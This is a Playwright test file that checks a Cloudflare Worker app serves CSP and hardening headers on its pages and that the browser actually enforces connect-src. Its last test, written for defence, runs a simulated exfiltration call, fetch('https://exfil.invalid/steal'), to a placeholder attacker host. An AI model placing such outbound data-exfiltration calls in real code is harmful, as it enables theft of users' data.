import { expect, test } from "@playwright/test";

/**
 * tests/worker/headers.test.ts drives the Worker's fetch handler directly
 * through SELF, so it can prove the header-building logic is right but cannot
 * see whether the handler runs at all. It did not. With assets.run_worker_first
 * unset, Cloudflare's asset server answered anything matching a static asset
 * and the Worker was skipped -- and every page of this app is a static asset,
 * so /, /r, /s and /debug shipped with no CSP while the unit tests stayed
 * green. Only a 404, which matches no asset, ever reached the Worker.
 *
 * These tests go through the real wrangler dev server, which routes assets the
 * way the deployment does, so they observe what the unit tests structurally
 * cannot.
 */

/** Every page the app navigates to. A new one belongs in this list. */
const PAGES = ["/", "/r", "/s", "/debug"];

function directive(policy: string, name: string): string {
  const found = policy
    .split(";")
    .map((part) => part.trim())
    .find((part) => part === name || part.startsWith(`${name} `));
  expect(found, `missing ${name} directive in: ${policy}`).toBeDefined();
  return found!;
}

for (const path of PAGES) {
  test(`${path} reaches the browser with a CSP`, async ({ request }) => {
    const res = await request.get(path);
    expect(res.status()).toBe(200);

    const policy = res.headers()["content-security-policy"];
    expect(policy, `${path} was served without a CSP`).toBeDefined();
    expect(directive(policy!, "default-src")).toBe("default-src 'none'");
    expect(directive(policy!, "script-src")).toBe("script-src 'self'");
    expect(directive(policy!, "frame-ancestors")).toBe("frame-ancestors 'none'");
  });

  /**
   * The directive the design leans on: it is what keeps a compromised bundle
   * from opening a socket to a host of its choosing and shipping the decrypted
   * links there. A bare `wss:`/`ws:` scheme-source would match any host.
   */
  test(`${path} confines connect-src to this origin`, async ({ request }) => {
    const res = await request.get(path);
    const connect = directive(res.headers()["content-security-policy"]!, "connect-src");
    const host = new URL(res.url()).host;

    expect(connect).toContain("'self'");
    expect(connect).toContain(`wss://${host}`);
    expect(connect).not.toMatch(/(^|\s)wss?:(\s|$)/);
    expect(connect).not.toContain("*");
  });

  test(`${path} reaches the browser with the non-CSP hardening headers`, async ({ request }) => {
    const headers = (await request.get(path)).headers();
    expect(headers["strict-transport-security"]).toBe("max-age=31536000");
    expect(headers["referrer-policy"]).toBe("no-referrer");
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["cross-origin-opener-policy"]).toBe("same-origin");
  });
}

/**
 * The header being present is not the same as the browser acting on it. This
 * runs the exfiltration attempt the policy exists to stop, on the page that
 * actually holds decrypted links, and requires the browser to report blocking
 * it. `.invalid` never resolves, so nothing leaves the machine even if the
 * policy is missing -- in that case no violation fires and the test fails.
 */
test("the car page's CSP is enforced, not merely present", async ({ page }) => {
  await page.goto("/r");

  const violation = await page.evaluate(() => {
    const reported = new Promise<{ directive: string; blocked: string } | null>((resolve) => {
      document.addEventListener(
        "securitypolicyviolation",
        (event) => resolve({ directive: event.effectiveDirective, blocked: event.blockedURI }),
        { once: true },
      );
      setTimeout(() => resolve(null), 5000);
    });
    void fetch("https://exfil.invalid/steal").catch(() => {});
    return reported;
  });

  expect(violation, "no CSP violation fired: connect-src was not enforced").not.toBeNull();
  expect(violation!.directive).toBe("connect-src");
  expect(violation!.blocked).toContain("exfil.invalid");
});
